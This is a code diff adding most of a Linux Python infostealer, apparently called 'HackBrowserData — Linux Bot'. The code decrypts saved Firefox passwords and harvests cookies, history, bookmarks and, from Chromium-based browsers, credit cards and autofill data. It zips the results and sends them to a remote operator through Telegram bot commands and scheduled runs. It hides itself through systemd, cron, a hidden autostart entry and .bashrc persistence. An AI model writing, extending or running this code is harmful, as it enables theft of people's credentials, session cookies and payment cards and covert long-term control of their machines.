+    """Decrypt one Firefox login field (base64-encoded SEQUENCE blob)."""
+    try:
+        blob = base64.b64decode(b64_val)
+        # SEQUENCE { SEQUENCE { OID(cipher), IV }, OCTET STRING(ct) }
+        _, outer, _ = _der_next(blob, 0)
+        pos = 0
+        _, enc_info, pos = _der_next(outer, pos)
+        _, ciphertext, _ = _der_next(outer, pos)
+
+        pos = 0
+        _, oid_r, pos = _der_next(enc_info, pos)
+        _, iv, _      = _der_next(enc_info, pos)
+        field_oid     = _oid_str(oid_r)
+
+        if field_oid == _OID_3DES or cipher_oid == _OID_3DES:
+            plain = DES3.new(key[:24], DES3.MODE_CBC, iv[:8]).decrypt(ciphertext)
+        else:
+            plain = AES.new(key[:32], AES.MODE_CBC, iv).decrypt(ciphertext)
+
+        # Remove PKCS#7 padding
+        pad_len = plain[-1]
+        if 1 <= pad_len <= 16:
+            plain = plain[:-pad_len]
+        return plain.decode('utf-8', errors='replace').strip('\x00')
+    except Exception:
+        return '[encrypted]'
+
+# ====================== FIREFOX EXTRACTORS =======================
+
+
+def get_firefox_passwords(profile):
+    logins_json = profile / 'logins.json'
+    if not logins_json.exists():
+        return []
+    key, oid = get_firefox_master_key(profile)
+    passwords = []
+    try:
+        data = json.loads(logins_json.read_text(encoding='utf-8'))
+        for login in data.get('logins', []):
+            url = login.get('formSubmitURL') or login.get('hostname', '')
+            eu  = login.get('encryptedUsername', '')
+            ep  = login.get('encryptedPassword', '')
+            if key:
+                username = _ff_decrypt_field(eu, key, oid)
+                password = _ff_decrypt_field(ep, key, oid)
+            else:
+                username = '[master password required]'
+                password = '[master password required]'
+            tc = login.get('timeCreated')
+            passwords.append({
+                'url':      url,
+                'username': username,
+                'password': password,
+                'created':  str(datetime.fromtimestamp(tc / 1000)) if tc else '',
+            })
+    except Exception:
+        pass
+    return passwords
+
+
+def get_firefox_cookies(profile):
+    db = profile / 'cookies.sqlite'
+    if not db.exists():
+        return []
+    def _q(cur):
+        rows = []
+        try:
+            cur.execute(
+                'SELECT host,name,value,path,expiry,isSecure,isHttpOnly '
+                'FROM moz_cookies ORDER BY host'
+            )
+            for host, name, val, path, exp, sec, httpo in cur.fetchall():
+                rows.append({
+                    'host': host, 'name': name, 'value': val or '',
+                    'path': path,
+                    'expires':  str(datetime.fromtimestamp(exp)) if exp else '',
+                    'secure':   bool(sec),
+                    'httponly': bool(httpo),
+                })
+        except Exception:
+            pass
+        return rows
+    return _with_db(db, _q)
+
+
+def get_firefox_history(profile):
+    db = profile / 'places.sqlite'
+    if not db.exists():
+        return []
+    def _q(cur):
+        rows = []
+        try:
+            cur.execute(
+                'SELECT url,title,visit_count,last_visit_date '
+                'FROM moz_places ORDER BY last_visit_date DESC LIMIT 1000'
+            )
+            for url, title, vc, lv in cur.fetchall():
+                rows.append({
+                    'url':        url,
+                    'title':      title or '',
+                    'visits':     vc,
+                    'last_visit': str(datetime.fromtimestamp(lv / 1_000_000)) if lv else '',
+                })
+        except Exception:
+            pass
+        return rows
+    return _with_db(db, _q)
+
+
+def get_firefox_bookmarks(profile):
+    db = profile / 'places.sqlite'
+    if not db.exists():
+        return []
+    def _q(cur):
+        rows = []
+        try:
+            cur.execute(
+                'SELECT b.title, p.url, b.dateAdded '
+                'FROM moz_bookmarks b '
+                'INNER JOIN moz_places p ON b.fk = p.id '
+                'WHERE b.type = 1 ORDER BY b.dateAdded DESC'
+            )
+            for title, url, da in cur.fetchall():
+                rows.append({
+                    'name':  title or '',
+                    'url':   url,
+                    'added': str(datetime.fromtimestamp(da / 1_000_000)) if da else '',
+                })
+        except Exception:
+            pass
+        return rows
+    return _with_db(db, _q)
+
+# ========================= DATA COLLECTION =======================
+
+
+def collect_all():
+    _kill_browsers()
+    result = {
+        'system':    system_info(),
+        'browsers':  {},
+        'timestamp': datetime.now().isoformat(),
+    }
+    paths = find_browser_paths()
+    for browser, path_or_list in paths.items():
+        result['browsers'][browser] = {}
+        try:
+            if 'firefox' in browser or 'librewolf' in browser or 'waterfox' in browser:
+                base     = path_or_list
+                profiles = find_firefox_profiles(base)
+                for prof in profiles:
+                    result['browsers'][browser][prof.name] = {
+                        'passwords': get_firefox_passwords(prof),
+                        'cookies':   get_firefox_cookies(prof),
+                        'history':   get_firefox_history(prof),
+                        'bookmarks': get_firefox_bookmarks(prof),
+                    }
+            else:
+                profiles = path_or_list
+                browser_base = profiles[0].parent if profiles else None
+                key = chromium_master_key(browser_base)
+                for prof in profiles:
+                    result['browsers'][browser][prof.name] = {
+                        'passwords':    get_chromium_passwords(prof, key, browser_base),
+                        'cookies':      get_chromium_cookies(prof, key, browser_base),
+                        'history':      get_chromium_history(prof),
+                        'bookmarks':    get_chromium_bookmarks(prof),
+                        'credit_cards': get_chromium_credit_cards(prof, key, browser_base),
+                        'downloads':    get_chromium_downloads(prof),
+                        'autofill':     get_chromium_autofill(prof),
+                    }
+        except Exception as e:
+            result['browsers'][browser]['error'] = str(e)
+    return result
+
+
+def _count(data, key):
+    n = 0
+    for pdict in data['browsers'].values():
+        for pdata in pdict.values():
+            if isinstance(pdata, dict):
+                n += len(pdata.get(key, []))
+    return n
+
+
+def make_zip(data):
+    """Format all collected data and pack into a ZIP file. Returns the path."""
+    tmp_dir = Path(tempfile.mkdtemp())
+    try:
+        files = {}
+        si    = data['system']
+        files['system_info.txt'] = '\n'.join(
+            f"{k}: {v}" for k, v in si.items()
+        )
+        files['full_data.json'] = json.dumps(data, indent=2, default=str)
+
+        for browser, prof_dict in data['browsers'].items():
+            for prof_name, pdata in prof_dict.items():
+                if not isinstance(pdata, dict):
+                    continue
+                pfx = f"{browser}_{prof_name}"
+
+                if pdata.get('passwords'):
+                    txt = f"=== {browser.upper()} — {prof_name} PASSWORDS ===\n\n"
+                    for p in pdata['passwords']:
+                        txt += (f"URL:      {p['url']}\n"
+                                f"Username: {p['username']}\n"
+                                f"Password: {p['password']}\n"
+                                f"Last used:{p.get('last_used','')}\n\n")
+                    files[f"{pfx}_passwords.txt"] = txt
+
+                if pdata.get('cookies'):
+                    txt = (f"=== {browser.upper()} — {prof_name} COOKIES "
+                           f"({len(pdata['cookies'])}) ===\n\n")
+                    for c in pdata['cookies'][:500]:
+                        txt += (f"Host:  {c['host']}\n"
+                                f"Name:  {c['name']}\n"
+                                f"Value: {str(c.get('value',''))[:200]}\n\n")
+                    files[f"{pfx}_cookies.txt"] = txt
+
+                if pdata.get('history'):
+                    txt = (f"=== {browser.upper()} — {prof_name} HISTORY "
+                           f"({len(pdata['history'])}) ===\n\n")
+                    for h in pdata['history'][:500]:
+                        txt += (f"URL:   {h['url']}\n"
+                                f"Title: {h.get('title','')}\n"
+                                f"Visits:{h.get('visits','')}\n"
+                                f"Last:  {h.get('last_visit','')}\n\n")
+                    files[f"{pfx}_history.txt"] = txt
+
+                if pdata.get('bookmarks'):
+                    txt = f"=== {browser.upper()} — {prof_name} BOOKMARKS ===\n\n"
+                    for b in pdata['bookmarks']:
+                        txt += (f"Name:   {b.get('name','')}\n"
+                                f"URL:    {b.get('url','')}\n"
+                                f"Folder: {b.get('folder','')}\n\n")
+                    files[f"{pfx}_bookmarks.txt"] = txt
+
+                if pdata.get('credit_cards'):
+                    txt = f"=== {browser.upper()} — {prof_name} CREDIT CARDS ===\n\n"
+                    for cc in pdata['credit_cards']:
+                        txt += (f"Name:   {cc['name']}\n"
+                                f"Number: {cc['number']}\n"
+                                f"Expiry: {cc['expiry']}\n\n")
+                    files[f"{pfx}_credit_cards.txt"] = txt
+
+                if pdata.get('downloads'):
+                    txt = (f"=== {browser.upper()} — {prof_name} DOWNLOADS "
+                           f"({len(pdata['downloads'])}) ===\n\n")
+                    for d in pdata['downloads'][:200]:
+                        txt += (f"URL:  {d.get('url','')}\n"
+                                f"Path: {d.get('path','')}\n"
+                                f"Date: {d.get('date','')}\n\n")
+                    files[f"{pfx}_downloads.txt"] = txt
+
+                if pdata.get('autofill'):
+                    txt = (f"=== {browser.upper()} — {prof_name} AUTOFILL "
+                           f"({len(pdata['autofill'])}) ===\n\n")
+                    for a in pdata['autofill'][:200]:
+                        txt += (f"Field: {a['field']}\nValue: {a['value']}\n"
+                                f"Count: {a['count']}\n\n")
+                    files[f"{pfx}_autofill.txt"] = txt
+
+        for fname, content in files.items():
+            (tmp_dir / fname).write_text(content, encoding='utf-8')
+
+        hostname = si.get('hostname', 'linux') or 'linux'
+        zip_name = f"linux_{hostname}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
+        zip_path = Path(tempfile.gettempdir()) / zip_name
+        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
+            for f in tmp_dir.iterdir():
+                zf.write(f, f.name)
+        return zip_path
+    finally:
+        shutil.rmtree(tmp_dir, ignore_errors=True)
+
+# ====================== BOT COMMAND HANDLERS =====================
+
+
+def handle_command(text, chat_id):
+    # Strip @BotName suffix and isolate the command word
+    cmd = text.split()[0].split('@')[0].lower().strip()
+
+    if cmd in ('/start', '/help'):
+        send_message(
+            '<b>🔐 HackBrowserData — Linux Bot</b>\n\n'
+            '<b>Commands:</b>\n'
+            '/extract  — Collect all browser data (ZIP)\n'
+            '/info     — System information\n'
+            '/browsers — List detected browsers\n'
+            '/status   — Bot status\n'
+            '/help     — This message',
+            chat_id
+        )
+
+    elif cmd == '/extract':
+        send_message('⏳ Collecting browser data…', chat_id)
+        zip_path = None
+        try:
+            data     = collect_all()
+            zip_path = make_zip(data)
+            stats = (
+                f'<b>✅ Extraction complete</b>\n\n'
+                f'<b>Host:</b>         {data["system"].get("hostname")}\n'
+                f'<b>User:</b>         {data["system"].get("username")}\n'
+                f'<b>Passwords:</b>    {_count(data,"passwords")}\n'
+                f'<b>Cookies:</b>      {_count(data,"cookies")}\n'
+                f'<b>History URLs:</b> {_count(data,"history")}\n'
+                f'<b>Bookmarks:</b>   {_count(data,"bookmarks")}\n'
+                f'<b>Credit cards:</b> {_count(data,"credit_cards")}\n'
+                f'<b>Downloads:</b>   {_count(data,"downloads")}\n'
+                f'<b>Autofill:</b>    {_count(data,"autofill")}'
+            )
+            send_message(stats, chat_id)
+            send_file(str(zip_path), chat_id, 'Browser data')
+        except Exception as e:
+            send_message(f'❌ Error during extraction: {e}', chat_id)
+        finally:
+            if zip_path:
+                try:
+                    zip_path.unlink()
+                except Exception:
+                    pass
+
+    elif cmd == '/info':
+        info = system_info()
+        send_message(
+            '<b>System Information:</b>\n' +
+            '\n'.join(f'<b>{k}:</b> {v}' for k, v in info.items()),
+            chat_id
+        )
+
+    elif cmd == '/browsers':
+        send_message('🔍 Scanning for browsers…', chat_id)
+        paths = find_browser_paths()
+        if not paths:
+            send_message('No browsers detected.', chat_id)
+            return
+        txt = f'<b>Browsers detected: {len(paths)}</b>\n\n'
+        for b, p in paths.items():
+            if isinstance(p, list):
+                txt += f'✓ <b>{b}</b> ({len(p)} profile(s))\n'
+            else:
+                txt += f'✓ <b>{b}</b> (Firefox-based)\n'
+        send_message(txt, chat_id)
+
+    elif cmd == '/status':
+        send_message(
+            f'<b>Status:</b> ✅ Running\n'
+            f'<b>Platform:</b> Linux\n'
+            f'<b>Python:</b> {sys.version.split()[0]}\n'
+            f'<b>Time:</b> {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}',
+            chat_id
+        )
+
+    else:
+        send_message(f'Unknown command: <code>{cmd}</code>  — use /help', chat_id)
+
+# ========================= PERSISTENCE ==========================
+
+
+def install_persistence():
+    script = str(Path(__file__).resolve())
+    home   = Path.home()
+    interp = sys.executable
+
+    # 1. systemd user service (most reliable on modern Linux)
+    try:
+        svc_dir = home / '.config' / 'systemd' / 'user'
+        svc_dir.mkdir(parents=True, exist_ok=True)
+        svc = svc_dir / 'hbd-agent.service'
+        svc.write_text(
+            '[Unit]\nDescription=HBD Agent\nAfter=network.target\n\n'
+            '[Service]\nType=simple\n'
+            f'ExecStart={interp} {script}\n'
+            'Restart=always\nRestartSec=60\n\n'
+            '[Install]\nWantedBy=default.target\n'
+        )
+        subprocess.run(['systemctl', '--user', 'daemon-reload'],
+                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.run(['systemctl', '--user', 'enable', '--now', 'hbd-agent.service'],
+                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        return
+    except Exception:
+        pass
+
+    # 2. cron @reboot fallback
+    try:
+        res    = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
+        cron   = res.stdout if res.returncode == 0 else ''
+        entry  = f'@reboot {interp} {script} >/dev/null 2>&1 &\n'
+        if script not in cron:
+            proc = subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE)
+            proc.communicate((cron + entry).encode())
+    except Exception:
+        pass
+
+    # 3. XDG autostart desktop entry
+    try:
+        ad = home / '.config' / 'autostart'
+        ad.mkdir(parents=True, exist_ok=True)
+        (ad / 'hbd-agent.desktop').write_text(
+            '[Desktop Entry]\nType=Application\nName=System Agent\n'
+            f'Exec={interp} {script}\nHidden=false\nNoDisplay=true\n'
+            'X-GNOME-Autostart-enabled=true\n'
+        )
+    except Exception:
+        pass
+
+    # 4. ~/.bashrc append (last-resort)
+    try:
+        bashrc = home / '.bashrc'
+        marker = f'# hbd-agent'
+        content = bashrc.read_text(encoding='utf-8') if bashrc.exists() else ''
+        if marker not in content:
+            with bashrc.open('a') as fh:
+                fh.write(
+                    f'\n{marker}\n'
+                    f'(pgrep -f "{script}" || {interp} {script}) &\n'
+                )
+    except Exception:
+        pass
+
+# ========================= LOCK FILE ============================
+
+_LOCK = Path(tempfile.gettempdir()) / f'hbd_linux_{os.getuid()}.lock'
+
+
+def _acquire_lock():
+    """Return False if another instance is already running."""
+    if _LOCK.exists():
+        try:
+            pid = int(_LOCK.read_text().strip())
+            os.kill(pid, 0)
+            return False                     # process is alive
+        except (ProcessLookupError, PermissionError):
+            pass                             # stale lock
+        except Exception:
+            pass
+    _LOCK.write_text(str(os.getpid()))
+    atexit.register(lambda: _LOCK.unlink() if _LOCK.exists() else None)
+    return True
+
+# ========================= BOT LOOP =============================
+
+
+def _auto_extract():
+    while True:
+        time.sleep(CHECK_INTERVAL)
+        try:
+            data = collect_all()
+            zp   = make_zip(data)
+            send_message(
+                f'⏰ Scheduled extraction — '
+                f'{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}'
+            )
+            send_file(str(zp), caption='Scheduled extraction')
+            try:
+                zp.unlink()
+            except Exception:
+                pass
+        except Exception as e:
+            print(f'[auto_extract] Error: {e}')
+            try:
+                send_message(f'⚠️ Scheduled extraction failed: {e}')
+            except Exception:
+                pass
+
+
+def _drain_updates():
+    """Discard any updates that arrived before the bot started."""
+    url = f'{_API}/getUpdates'
+    try:
+        r = requests.get(url, params={'timeout': 0, 'offset': -1}, timeout=10)
+        data = r.json()
+        if data.get('ok') and data.get('result'):
+            return data['result'][-1]['update_id'] + 1
+    except Exception:
+        pass
+    return None
+
+
+def run_bot():
+    delete_webhook()
+
+    si  = system_info()
+    msg = (
+        f'<b>🐧 Linux Bot Online</b>\n\n'
+        f'<b>Host:</b>     {si["hostname"]}\n'
+        f'<b>User:</b>     {si["username"]}\n'
+        f'<b>Home:</b>     {si["home"]}\n'
+        f'<b>Time:</b>     {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}\n\n'
+        f'Use /help for available commands.'
+    )
+    send_message(msg)
+
+    offset = _drain_updates()
+    errors = 0
+
+    while True:
+        updates = get_updates(offset)
+        if updates is None:
+            errors += 1
+            wait = min(2 ** errors, 120)
+            print(f'[poll] No response, retry in {wait}s (errors={errors})')
+            time.sleep(wait)
+            if errors >= 5:
+                delete_webhook()
+                errors = 0
+            continue
+        errors = 0
+        for upd in updates.get('result', []):
+            offset = upd['update_id'] + 1
+            msg    = upd.get('message', {})
+            text   = msg.get('text', '')
+            cid    = msg.get('chat', {}).get('id')
+            if text.startswith('/') and cid:
+                if not _is_authorized(cid):
+                    send_message('⛔ Unauthorized.', cid)
+                    continue
+                try:
+                    handle_command(text, cid)
+                except Exception as e:
+                    send_message(f'❌ Error: {e}', cid)
+        time.sleep(1)
+
+# ============================= MAIN =============================
+
+
+def main():
+    if not _acquire_lock():
+        sys.exit(0)
+
+    if AUTO_PERSIST:
+        try:
+            install_persistence()
+        except Exception:
+            pass
+
+    if CHECK_INTERVAL > 0:
+        threading.Thread(target=_auto_extract, daemon=True).start()
+
+    while True:
+        try:
+            run_bot()
+        except KeyboardInterrupt:
+            send_message('🛑 Bot stopped.')
+            break
+        except Exception:
+            time.sleep(60)
+
+
+if __name__ == '__main__':
+    main()
